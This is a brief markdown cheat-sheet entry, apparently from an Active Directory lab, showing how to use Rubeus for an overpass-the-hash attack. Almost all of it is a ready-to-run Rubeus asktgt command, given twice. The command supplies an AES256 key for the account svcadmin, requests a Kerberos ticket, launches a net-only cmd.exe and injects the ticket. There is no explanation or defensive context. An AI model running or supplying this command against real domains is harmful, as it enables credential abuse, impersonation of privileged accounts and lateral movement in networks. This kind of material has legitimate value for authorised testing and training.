# Rubeus

## Use Rubeus to Over Pass the Hash

```
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin 
/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 
/opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Command Below is the same as above just not broken up

```
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
